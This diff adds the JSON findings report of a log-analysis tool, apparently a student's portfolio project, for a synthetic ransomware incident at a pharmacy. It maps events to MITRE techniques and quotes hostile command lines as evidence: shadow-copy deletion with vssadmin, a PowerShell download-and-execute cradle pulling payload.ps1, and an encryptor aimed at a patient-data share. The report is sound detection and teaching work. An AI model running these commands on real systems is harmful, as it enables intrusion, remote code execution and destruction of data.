@@ -1,0 +1,388 @@
+{
+  "metadata": {
+    "tool": "analyze_logs.py",
+    "version": "1.0.0",
+    "generated_at": "2026-06-01T01:55:40.049711",
+    "author": "Vincent Phan (CPhT, CSUSB-bound IT/Cybersecurity student)",
+    "disclaimer": "Synthetic data analysis for portfolio purposes. No real PHI.",
+    "input_event_count": 31,
+    "finding_count": 9,
+    "total_risk_score": 63,
+    "max_possible_score": 89,
+    "risk_level": "CRITICAL"
+  },
+  "findings": [
+    {
+      "severity": "CRITICAL",
+      "category": "shadow_deletion",
+      "technique": "T1490",
+      "tactic": "Inhibit System Recovery",
+      "description": "Volume shadow copy or recovery mechanism tampered with in 1 events.",
+      "event_ids": [
+        "4688"
+      ],
+      "timestamps": [
+        "2026-05-15T18:48:00.000000Z"
+      ],
+      "score": 9,
+      "details": [
+        "vssadmin delete shadows /all /quiet c:\\windows\\system32\\vssadmin.exe true portfolio-sample-2026 [synthetic] process created: new process c:\\windows\\system32\\vssadmin.exe with command line 'vssadmin de"
+      ]
+    },
+    {
+      "severity": "CRITICAL",
+      "category": "suspicious_powershell",
+      "technique": "T1059.001",
+      "tactic": "Command and Scripting Interpreter: PowerShell",
+      "description": "Detected 4 suspicious PowerShell/scripting events. 2 involve download/encoding patterns.",
+      "event_ids": [
+        "1",
+        "400",
+        "4103"
+      ],
+      "timestamps": [
+        "2026-05-15T18:13:00.000000Z",
+        "2026-05-15T18:12:00.000000Z"
+      ],
+      "score": 9,
+      "details": [
+        "true portfolio-sample-2026 [synthetic] engine state changed from none to available. session started by user pharm-tech\\jchen. ",
+        "true portfolio-sample-2026 [synthetic] remote host is started. host application path: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe ",
+        "invoke-expression -command (new-object net.webclient).downloadstring('http://192.168.200.55/payload.ps1') true portfolio-sample-2026 [synthetic] command invoked: 'invoke-expression -command (new-objec"
+      ]
+    },
+    {
+      "severity": "CRITICAL",
+      "category": "defender_disable",
+      "technique": "T1562.001",
+      "tactic": "Impair Defenses: Disable or Modify Tools",
+      "description": "Detected 2 events indicating Windows Defender or AV tampering.",
+      "event_ids": [
+        "5001"
+      ],
+      "timestamps": [
+        "2026-05-15T18:35:00.000000Z",
+        "2026-05-15T18:38:00.000000Z"
+      ],
+      "score": 9,
+      "details": [
+        "true portfolio-sample-2026 [synthetic] antimalware protection disabled on pharm-ws-disp. reason: user action. ",
+        "true portfolio-sample-2026 [synthetic] antimalware protection disabled on pharm-dc-01. reason: user action. "
+      ]
+    },
+    {
+      "severity": "CRITICAL",
+      "category": "file_encryption",
+      "technique": "T1486",
+      "tactic": "Data Encrypted for Impact",
+      "description": "Detected 1 file modification events with suspicious extensions (e.g., .encrypted, .locked).",
+      "event_ids": [
+        "4688"
+      ],
+      "timestamps": [
+        "2026-05-15T18:52:00.000000Z"
+      ],
+      "score": 8,
+      "details": [
+        "encryptor.exe -target \\\\\\\\pharm-dc\\shared\\patientdata -ext .encrypted c:\\windows\\temp\\encryptor.exe true portfolio-sample-2026 [synthetic] process created: new process c:\\windows\\temp\\encryptor.exe wi"
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "category": "external_rdp",
+      "technique": "T1021.001",
+      "tactic": "Remote Services: RDP",
+      "description": "Detected 4 successful/failed RDP logins from external IP addresses: ['203.0.113.77'].",
+      "event_ids": [
+        "4625",
+        "4624"
+      ],
+      "timestamps": [
+        "2026-05-15T19:22:00.000000Z",
+        "2026-05-15T19:30:00.000000Z",
+        "2026-05-15T19:25:00.000000Z",
+        "2026-05-15T19:35:00.000000Z"
+      ],
+      "score": 7,
+      "details": [
+        "10 203.0.113.77 unknown true portfolio-sample-2026 [synthetic] failed logon: unknown user from ip 203.0.113.77 (external). logon type 10 (remoteinteractive). ",
+        "10 203.0.113.77 unknown true portfolio-sample-2026 [synthetic] failed logon: unknown user from ip 203.0.113.77 (external). logon type 10 (remoteinteractive). ",
+        "10 203.0.113.77 admin true portfolio-sample-2026 [synthetic] failed logon: pharm-tech\\admin from ip 203.0.113.77 (external). logon type 10 (remoteinteractive). "
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "category": "lateral_movement",
+      "technique": "T1078",
+      "tactic": "Valid Accounts",
+      "description": "Detected 4 events suggesting lateral movement (network logons, explicit credential use).",
+      "event_ids": [
+        "4648",
+        "4624"
+      ],
+      "timestamps": [
+        "2026-05-15T18:25:00.000000Z",
+        "2026-05-15T18:15:00.000000Z",
+        "2026-05-15T18:27:00.000000Z",
+        "2026-05-15T18:22:00.000000Z"
+      ],
+      "score": 6,
+      "details": [
+        "3 10.0.1.45 jchen true portfolio-sample-2026 [synthetic] successful logon: pharm-tech\\jchen from workstation pharm-ws-03. logon type 3 (network). ",
+        "3 10.0.1.10 svc_backup true portfolio-sample-2026 [synthetic] successful logon: pharm-tech\\svc_backup from pharm-dc-01. logon type 3 (network). ",
+        "3 10.0.1.10 admin true portfolio-sample-2026 [synthetic] successful logon: pharm-tech\\admin from pharm-dc-01. logon type 3 (network). "
+      ]
+    },
+    {
+      "severity": "HIGH",
+      "category": "suspicious_process",
+      "technique": "T1059",
+      "tactic": "Command and Scripting Interpreter",
+      "description": "Detected 3 suspicious process creation events.",
+      "event_ids": [
+        "4688"
+      ],
+      "timestamps": [
+        "2026-05-15T18:52:00.000000Z",
+        "2026-05-15T18:48:00.000000Z"
+      ],
+      "score": 6,
+      "details": [
+        "vssadmin delete shadows /all /quiet c:\\windows\\system32\\vssadmin.exe true portfolio-sample-2026 [synthetic] process created: new process c:\\windows\\system32\\vssadmin.exe with command line 'vssadmin de",
+        "vssadmin delete shadows /all /quiet c:\\windows\\system32\\vssadmin.exe true portfolio-sample-2026 [synthetic] process created: new process c:\\windows\\system32\\vssadmin.exe with command line 'vssadmin de",
+        "encryptor.exe -target \\\\\\\\pharm-dc\\shared\\patientdata -ext .encrypted c:\\windows\\temp\\encryptor.exe true portfolio-sample-2026 [synthetic] process created: new process c:\\windows\\temp\\encryptor.exe wi"
+      ]
+    },
+    {
+      "severity": "MEDIUM",
+      "category": "brute_force",
+      "technique": "T1110",
+      "tactic": "Brute Force",
+      "description": "Detected 3 failed logon events (possible brute-force or credential stuffing).",
+      "event_ids": [
+        "4625"
+      ],
+      "timestamps": [
+        "2026-05-15T19:22:00.000000Z",
+        "2026-05-15T19:30:00.000000Z",
+        "2026-05-15T19:25:00.000000Z"
+      ],
+      "score": 5,
+      "details": [
+        "10 203.0.113.77 unknown true portfolio-sample-2026 [synthetic] failed logon: unknown user from ip 203.0.113.77 (external). logon type 10 (remoteinteractive). ",
+        "10 203.0.113.77 unknown true portfolio-sample-2026 [synthetic] failed logon: unknown user from ip 203.0.113.77 (external). logon type 10 (remoteinteractive). ",
+        "10 203.0.113.77 admin true portfolio-sample-2026 [synthetic] failed logon: pharm-tech\\admin from ip 203.0.113.77 (external). logon type 10 (remoteinteractive). "
+      ]
+    },
+    {
+      "severity": "MEDIUM",
+      "category": "iot_disconnect",
+      "technique": "T1496",
+      "tactic": "Resource Hijacking",
+      "description": "Detected 3 IoT/sensor disconnect events. Pharmacy temperature monitoring may be compromised.",
+      "event_ids": [
+        "1",
+        "1014"
+      ],
+      "timestamps": [
+        "2026-05-15T19:16:00.000000Z",
+        "2026-05-15T19:18:00.000000Z",
+        "2026-05-15T19:15:00.000000Z"
+      ],
+      "score": 4,
+      "details": [
+        "true portfolio-sample-2026 [synthetic] service stop: iot_tempsensor (temperature monitoring service on vlan 30). ",
+        "true portfolio-sample-2026 [synthetic] service stop: iot_humiditysensor (humidity monitoring service on vlan 30). ",
+        "temp-sensor-01.pharm.local true portfolio-sample-2026 [synthetic] dns resolution failed: name resolution for the name temp-sensor-01.pharm.local timed out after none of the configured dns servers resp"
+      ]
+    }
+  ],
+  "timeline": [
+    {
+      "timestamp": "2026-05-15T18:00:00.000000Z",
+      "event_id": "4624",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:07:00.000000Z",
+      "event_id": "1040",
+      "channel": "Application",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:12:00.000000Z",
+      "event_id": "1",
+      "channel": "Windows PowerShell",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:12:00.000000Z",
+      "event_id": "400",
+      "channel": "Windows PowerShell",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:13:00.000000Z",
+      "event_id": "4103",
+      "channel": "Windows PowerShell",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:15:00.000000Z",
+      "event_id": "4624",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:22:00.000000Z",
+      "event_id": "4624",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:25:00.000000Z",
+      "event_id": "4624",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:27:00.000000Z",
+      "event_id": "4648",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:32:00.000000Z",
+      "event_id": "1",
+      "channel": "System",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:35:00.000000Z",
+      "event_id": "5001",
+      "channel": "Microsoft-Windows-Windows Defender/Operational",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:38:00.000000Z",
+      "event_id": "5001",
+      "channel": "Microsoft-Windows-Windows Defender/Operational",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:42:00.000000Z",
+      "event_id": "1",
+      "channel": "System",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:47:00.000000Z",
+      "event_id": "1",
+      "channel": "System",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:48:00.000000Z",
+      "event_id": "4688",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:52:00.000000Z",
+      "event_id": "4688",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:55:00.000000Z",
+      "event_id": "4663",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T18:57:00.000000Z",
+      "event_id": "4663",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:00:00.000000Z",
+      "event_id": "4663",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:05:00.000000Z",
+      "event_id": "4663",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:12:00.000000Z",
+      "event_id": "4663",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:15:00.000000Z",
+      "event_id": "1",
+      "channel": "System",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:16:00.000000Z",
+      "event_id": "1",
+      "channel": "System",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:18:00.000000Z",
+      "event_id": "1014",
+      "channel": "System",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:22:00.000000Z",
+      "event_id": "4625",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:25:00.000000Z",
+      "event_id": "4625",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:30:00.000000Z",
+      "event_id": "4625",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:35:00.000000Z",
+      "event_id": "4624",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:40:00.000000Z",
+      "event_id": "4688",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:45:00.000000Z",
+      "event_id": "4663",
+      "channel": "Security",
+      "description": ""
+    },
+    {
+      "timestamp": "2026-05-15T19:50:00.000000Z",
+      "event_id": "4656",
+      "channel": "Security",
+      "description": ""
+    }
+  ]
+}
